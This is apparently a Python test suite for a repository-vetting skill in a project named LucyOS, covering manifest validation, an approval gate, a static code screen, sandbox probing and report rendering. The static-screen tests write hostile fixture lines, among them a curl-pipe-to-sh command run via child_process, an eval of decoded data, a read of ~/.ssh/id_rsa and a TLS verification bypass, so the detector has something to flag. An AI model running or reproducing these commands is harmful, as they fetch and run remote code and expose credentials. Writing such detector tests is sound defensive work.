"""Behavioural tests for the learnrepo skill.

These run inside the normal LucyOS suite so the skill cannot rot silently.
They are deliberately weighted toward the *refusal* paths: the failure mode
that matters is not "the gate rejected something good", it is "the gate waved
through something unverified".

Standard library only, matching LucyOS's dependency policy. The skill's
scripts are loaded by path so the skill directory stays self-contained and
movable.
"""
from __future__ import annotations

import copy
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
SKILL_DIR = REPO_ROOT / ".claude" / "skills" / "learnrepo"
SCRIPTS_DIR = SKILL_DIR / "scripts"
EXAMPLE_MANIFEST = SKILL_DIR / "assets" / "example-passing-manifest.json"


def _load(module_name: str):
    """Import a skill script by path without permanently polluting sys.path."""
    path = SCRIPTS_DIR / f"{module_name}.py"
    if str(SCRIPTS_DIR) not in sys.path:
        sys.path.insert(0, str(SCRIPTS_DIR))
    spec = importlib.util.spec_from_file_location(module_name, path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


paths_mod = _load("learnrepo_paths")
validate_mod = _load("validate_manifest")
gate_mod = _load("gate")
screen_mod = _load("static_screen")
report_mod = _load("render_report")
probe_mod = _load("sandbox_probe")


def passing_manifest() -> dict:
    with EXAMPLE_MANIFEST.open(encoding="utf-8") as fh:
        return json.load(fh)


class TestSkillPackage(unittest.TestCase):
    """The skill must remain a valid, self-consistent package."""

    def test_exactly_one_skill_md(self):
        found = [p for p in SKILL_DIR.rglob("SKILL.md") if "__pycache__" not in p.parts]
        self.assertEqual(len(found), 1, f"a skill must have exactly one SKILL.md, found {found}")

    def test_frontmatter_declares_name_and_description(self):
        text = (SKILL_DIR / "SKILL.md").read_text(encoding="utf-8")
        self.assertTrue(text.startswith("---\n"), "SKILL.md must open with YAML frontmatter")
        end = text.index("\n---", 4)
        front = text[4:end]
        fields = {}
        for line in front.splitlines():
            if ":" in line and not line.startswith(" "):
                key, _, value = line.partition(":")
                fields[key.strip()] = value.strip()
        self.assertEqual(fields.get("name"), "learnrepo")
        self.assertEqual(fields.get("name"), SKILL_DIR.name,
                         "frontmatter name must match the directory name")
        self.assertGreater(len(fields.get("description", "")), 200,
                           "the description is the trigger mechanism; it needs real detail")

    def test_every_referenced_file_exists(self):
        """A reference SKILL.md names but does not ship is a dead end mid-task."""
        text = (SKILL_DIR / "SKILL.md").read_text(encoding="utf-8")
        missing = []
        for token in ("references/", "scripts/", "assets/"):
            start = 0
            while True:
                idx = text.find(token, start)
                if idx == -1:
                    break
                end = idx
                while end < len(text) and (text[end].isalnum() or text[end] in "._-/"):
                    end += 1
                rel = text[idx:end]
                start = end
                if rel.endswith((".md", ".py", ".json")) and not (SKILL_DIR / rel).exists():
                    missing.append(rel)
        self.assertEqual(missing, [], f"SKILL.md references missing files: {missing}")

    def test_scripts_are_stdlib_only(self):
        """LucyOS is standard library only; the skill must not quietly break that."""
        third_party = ("import requests", "import yaml", "import jsonschema",
                       "import pydantic", "from requests", "from yaml")
        for script in SCRIPTS_DIR.glob("*.py"):
            text = script.read_text(encoding="utf-8")
            for needle in third_party:
                self.assertNotIn(
                    needle, text,
                    f"{script.name} imports a third-party module ({needle})")

    def test_scripts_compile(self):
        for script in sorted(SCRIPTS_DIR.glob("*.py")):
            with self.subTest(script=script.name):
                result = subprocess.run(
                    [sys.executable, "-m", "py_compile", str(script)],
                    shell=False, capture_output=True, text=True)
                self.assertEqual(result.returncode, 0, result.stderr)


class TestManifestValidation(unittest.TestCase):
    def test_example_fixture_is_valid(self):
        self.assertEqual(validate_mod.validate(passing_manifest()), [])

    def test_blank_manifest_is_structurally_valid(self):
        """Blank must be *valid* but not *eligible* — that separation is the point."""
        blank = paths_mod.blank_manifest("some-capability")
        self.assertEqual(validate_mod.validate(blank), [])

    def test_missing_top_level_key_is_reported(self):
        m = passing_manifest()
        del m["license"]
        self.assertTrue(any("license" in p for p in validate_mod.validate(m)))

    def test_bad_enums_and_ranges_are_reported(self):
        cases = [
            ("severity", lambda m: m["security"]["findings"].append(
                {"title": "x", "severity": "catastrophic", "disposition": "open"})),
            ("evidence type", lambda m: m["evidence"].append(
                {"claim": "x", "type": "vibes"})),
            ("score range", lambda m: m["confidence"].__setitem__("overall", 140)),
            ("test result", lambda m: m["tests"]["suites"].append(
                {"name": "x", "result": "probably"})),
            ("status", lambda m: m.__setitem__("status", "vibing")),
            ("capability id", lambda m: m.__setitem__("capability_id", "Not Valid ID")),
        ]
        for label, mutate in cases:
            with self.subTest(case=label):
                m = passing_manifest()
                mutate(m)
                self.assertNotEqual(validate_mod.validate(m), [],
                                    f"{label} should have been rejected")

    def test_schema_version_mismatch_is_reported(self):
        m = passing_manifest()
        m["schema_version"] = 99
        self.assertTrue(any("schema_version" in p for p in validate_mod.validate(m)))


class TestGateRefuses(unittest.TestCase):
    """Each case takes a manifest that would otherwise pass and breaks one thing."""

    def assert_blocked(self, manifest, needle):
        result = gate_mod.evaluate(manifest)
        self.assertFalse(result["eligible_for_approval_request"])
        joined = " ".join(result["blocking"]).lower()
        self.assertIn(needle.lower(), joined,
                      f"expected a blocking reason mentioning {needle!r}, got {result['blocking']}")

    def test_blank_manifest_is_never_eligible(self):
        result = gate_mod.evaluate(paths_mod.blank_manifest("empty-thing"))
        self.assertFalse(result["eligible_for_approval_request"])
        self.assertGreater(len(result["blocking"]), 5)

    def test_open_critical_finding_vetoes_perfect_scores(self):
        """The whole point of a veto: scores cannot average away a live risk."""
        m = passing_manifest()
        for key in m["confidence"]:
            m["confidence"][key] = 100
        m["security"]["findings"].append({
            "id": "F-9", "severity": "critical", "title": "remote code execution on import",
            "evidence": "…", "disposition": "open", "confidence": "high"})
        self.assert_blocked(m, "critical")

    def test_open_high_finding_blocks(self):
        m = passing_manifest()
        m["security"]["findings"].append({
            "id": "F-8", "severity": "high", "title": "reads ssh keys",
            "evidence": "…", "disposition": "open", "confidence": "high"})
        self.assert_blocked(m, "high")

    def test_patched_finding_does_not_block(self):
        """Disclosed-and-fixed must remain mergeable, or nobody will disclose."""
        m = passing_manifest()
        m["security"]["findings"].append({
            "id": "F-7", "severity": "high", "title": "unpinned download",
            "evidence": "…", "disposition": "patched", "confidence": "high"})
        self.assertTrue(gate_mod.evaluate(m)["eligible_for_approval_request"])

    def test_each_threshold_blocks_one_point_below(self):
        for key, minimum in gate_mod.THRESHOLDS.items():
            with self.subTest(score=key):
                m = passing_manifest()
                m["confidence"][key] = minimum - 1
                self.assert_blocked(m, key)

    def test_unscored_dimension_blocks(self):
        m = passing_manifest()
        m["confidence"]["security"] = None
        self.assert_blocked(m, "unknown")

    def test_non_passing_test_results_block(self):
        for result in ("skipped", "mocked", "flaky", "not_run", "fail", "error"):
            with self.subTest(result=result):
                m = passing_manifest()
                m["tests"]["suites"][0]["result"] = result
                self.assert_blocked(m, "not 'pass'")

    def test_missing_regression_run_blocks(self):
        m = passing_manifest()
        m["tests"]["regression_suite_run"] = False
        self.assert_blocked(m, "regression suite was not run")

    def test_untested_rollback_blocks(self):
        m = passing_manifest()
        m["rollback"]["tested"] = False
        self.assert_blocked(m, "rollback has not been tested")

    def test_unverified_provenance_blocks(self):
        m = passing_manifest()
        m["source"]["provenance_verified"] = False
        self.assert_blocked(m, "provenance")

    def test_missing_revision_blocks(self):
        m = passing_manifest()
        m["source"]["commit"] = ""
        m["source"]["tag"] = ""
        m["source"]["version"] = ""
        self.assert_blocked(m, "commit")

    def test_license_problems_block(self):
        cases = {
            "not identified": lambda m: m["license"].__setitem__("spdx", ""),
            "not recorded as compatible": lambda m: m["license"].__setitem__(
                "compatible_with_lucyos", None),
            "source of truth": lambda m: m["license"].__setitem__("source_of_truth", ""),
            "legal review": lambda m: m["license"].__setitem__("requires_legal_review", True),
        }
        for needle, mutate in cases.items():
            with self.subTest(case=needle):
                m = passing_manifest()
                mutate(m)
                self.assert_blocked(m, needle)

    def test_execution_without_containment_blocks(self):
        """Claiming a sandbox that was never used is worse than not executing."""
        m = passing_manifest()
        m["security"]["execution_performed"] = True
        m["security"]["sandbox"] = "none"
        self.assert_blocked(m, "without a recorded containment")

    def test_execution_with_recorded_containment_is_allowed(self):
        m = passing_manifest()
        m["security"]["execution_performed"] = True
        m["security"]["sandbox"] = "docker --network=none --read-only"
        self.assertTrue(gate_mod.evaluate(m)["eligible_for_approval_request"])

    def test_external_service_must_keep_activation_separate(self):
        m = passing_manifest()
        m["external_services"]["required"] = True
        m["external_services"]["activation_is_separate_approval"] = False
        self.assert_blocked(m, "separate approval")

    def test_external_service_warns_even_when_eligible(self):
        m = passing_manifest()
        m["external_services"]["required"] = True
        m["external_services"]["privacy_review_required"] = True
        m["external_services"]["cost_review_required"] = True
        result = gate_mod.evaluate(m)
        self.assertTrue(result["eligible_for_approval_request"])
        joined = " ".join(result["warnings"]).lower()
        self.assertIn("privacy review", joined)
        self.assertIn("cost review", joined)

    def test_invalid_manifest_blocks_rather_than_crashing(self):
        result = gate_mod.evaluate({"schema_version": 1})
        self.assertFalse(result["eligible_for_approval_request"])
        self.assertTrue(any("structurally invalid" in b for b in result["blocking"]))

    def test_gate_never_reports_approval_granted(self):
        """Eligibility is permission to ask, never permission to merge."""
        result = gate_mod.evaluate(passing_manifest())
        self.assertTrue(result["eligible_for_approval_request"])
        self.assertNotIn("approved", json.dumps(result).lower().split('"note"')[0])
        self.assertIn("does not mean approved", result["note"])


class TestStaticScreen(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, rel: str, text: str) -> Path:
        path = self.root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def categories(self) -> set:
        return {f["category"] for f in screen_mod.screen(self.root)["findings"]}

    def test_detects_the_dangerous_patterns(self):
        self.write("package.json",
                   '{"scripts": {"postinstall": "node ./s.js"}}')
        self.write("s.js",
                   'child_process.exec("curl https://x.invalid/a.sh | sh");\n'
                   'eval(atob("AAAA"));\n'
                   'const t = process.env.API_TOKEN;\n')
        self.write("u.py",
                   'import subprocess, os\n'
                   'subprocess.run("ls " + os.environ.get("X"), shell=True)\n'
                   'open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'
                   'requests.get("https://x.invalid", verify=False)\n')
        found = self.categories()
        for expected in ("install_hook", "remote_code_load", "dynamic_eval",
                         "shell_execution", "credential_access",
                         "security_control_disable", "env_secret_read"):
            self.assertIn(expected, found, f"{expected} was not detected")

    def test_shell_true_is_detected_across_nested_parens(self):
        """Regression: an [^)]* pattern silently missed this common form."""
        self.write("a.py",
                   'subprocess.run("ls " + os.environ.get("USER_INPUT"), shell=True)\n')
        self.assertIn("shell_execution", self.categories())

    def test_credentials_are_redacted_in_output(self):
        secret = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
        self.write("leak.py", f'TOKEN = "{secret}"\n')
        report = screen_mod.screen(self.root)
        blob = json.dumps(report)
        self.assertIn("committed_secret", blob)
        self.assertNotIn(secret, blob,
                         "a screen that echoes the credential it found has leaked it")

    def test_binary_and_archive_files_are_flagged_not_parsed(self):
        (self.root / "lib.so").write_bytes(b"\x7fELF\x00\x01\x02binary")
        (self.root / "bundle.zip").write_bytes(b"PK\x03\x04binary")
        cats = self.categories()
        self.assertIn("opaque_artifact", cats)

    def test_screen_does_not_execute_candidate_code(self):
        """If the screen ever imports or runs the tree, this sentinel appears."""
        sentinel = self.root / "EXECUTED"
        self.write("evil.py",
                   f'from pathlib import Path\n'
                   f'Path({str(sentinel)!r}).write_text("executed")\n')
        self.write("setup.py",
                   f'from pathlib import Path\n'
                   f'Path({str(sentinel)!r}).write_text("executed")\n')
        screen_mod.screen(self.root)
        self.assertFalse(sentinel.exists(),
                         "static_screen executed candidate code — it must only read")

    def test_clean_tree_produces_no_high_findings(self):
        self.write("readme.md", "# hello\n\nA small library.\n")
        self.write("calc.py", "def add(a, b):\n    return a + b\n")
        report = screen_mod.screen(self.root)
        high = [f for f in report["findings"] if f["severity"] in ("critical", "high")]
        self.assertEqual(high, [])
        self.assertIn("not proof of safety", report["disclaimer"])


class TestSandboxProbe(unittest.TestCase):
    def test_missing_binary_is_never_reported_usable(self):
        result = probe_mod.probe_one({
            "name": "definitely-not-installed",
            "argv": ["lucyos-no-such-binary-xyz", "--version"],
            "strength": "weak", "note": "",
        })
        self.assertFalse(result["present"])
        self.assertFalse(result["usable"])

    def test_present_but_failing_command_is_not_usable(self):
        """The docker-installed-but-daemon-down trap, which is the whole point."""
        result = probe_mod.probe_one({
            "name": "false-command",
            "argv": ["false"],
            "strength": "strong", "note": "",
        })
        self.assertTrue(result["present"])
        self.assertFalse(result["usable"])
        self.assertIn("NOT usable", result["detail"])

    def test_report_shape_is_honest(self):
        report = probe_mod.probe()
        self.assertIn("recommendation", report)
        self.assertIn("does not make untrusted code safe", report["caveat"])
        if not report["usable_containment"]:
            self.assertIn("Do NOT execute", report["recommendation"])


class TestReport(unittest.TestCase):
    def test_all_sixteen_sections_render(self):
        m = passing_manifest()
        text = report_mod.render(m, gate_mod.evaluate(m))
        headings = [line for line in text.splitlines() if line.startswith("## ")]
        self.assertEqual(len(headings), 16, headings)

    def test_eligible_report_asks_a_precise_question(self):
        m = passing_manifest()
        text = report_mod.render(m, gate_mod.evaluate(m))
        self.assertIn("Approve merging capability", text)
        self.assertIn(m["integration"]["branch"], text)
        self.assertIn("Silence is not approval", text)

    def test_blocked_report_refuses_to_ask(self):
        m = passing_manifest()
        m["rollback"]["tested"] = False
        text = report_mod.render(m, gate_mod.evaluate(m))
        self.assertIn("Not ready to request merge approval", text)
        self.assertNotIn("Approve merging capability", text)

    def test_report_states_uncertainty_rather_than_guarantees(self):
        m = passing_manifest()
        text = report_mod.render(m, gate_mod.evaluate(m)).lower()
        self.assertIn("cannot be guaranteed", text)
        for absolute in ("100% safe", "fully guaranteed", "works 100%"):
            self.assertNotIn(absolute, text)

    def test_patched_findings_stay_visible_in_the_report(self):
        m = passing_manifest()
        m["security"]["findings"].append({
            "id": "F-6", "severity": "high", "title": "unpinned artifact download",
            "evidence": "…", "disposition": "patched", "confidence": "high"})
        text = report_mod.render(m, gate_mod.evaluate(m))
        self.assertIn("unpinned artifact download", text)
        self.assertIn("Fixing one issue does not make", text)


class TestWorkspace(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self._prev = os.environ.get("LEARNREPO_HOME")
        os.environ["LEARNREPO_HOME"] = self.tmp.name

    def tearDown(self):
        if self._prev is None:
            os.environ.pop("LEARNREPO_HOME", None)
        else:
            os.environ["LEARNREPO_HOME"] = self._prev
        self.tmp.cleanup()

    def test_artifacts_live_outside_the_repository(self):
        """Evidence and quarantined source must never land in a public repo."""
        root = paths_mod.home()
        self.assertFalse(str(root).startswith(str(REPO_ROOT)),
                         f"artifact root {root} is inside the repository")

    def test_new_investigation_creates_a_blocking_manifest(self):
        learnrepo = _load("learnrepo")
        self.assertEqual(learnrepo.main(["new", "test-capability"]), 0)
        manifest_path = paths_mod.investigation_dir("test-capability") / "manifest.json"
        self.assertTrue(manifest_path.exists())
        manifest = paths_mod.read_json(manifest_path)
        self.assertEqual(validate_mod.validate(manifest), [])
        self.assertFalse(gate_mod.evaluate(manifest)["eligible_for_approval_request"])

    def test_quarantine_carries_a_warning(self):
        learnrepo = _load("learnrepo")
        learnrepo.main(["new", "quarantine-check"])
        note = (paths_mod.investigation_dir("quarantine-check") / "candidate" / "README.txt")
        self.assertIn("untrusted", note.read_text(encoding="utf-8"))

    def test_invalid_capability_id_is_rejected(self):
        learnrepo = _load("learnrepo")
        self.assertEqual(learnrepo.main(["new", "Not A Valid Id"]), 2)


if __name__ == "__main__":
    unittest.main()
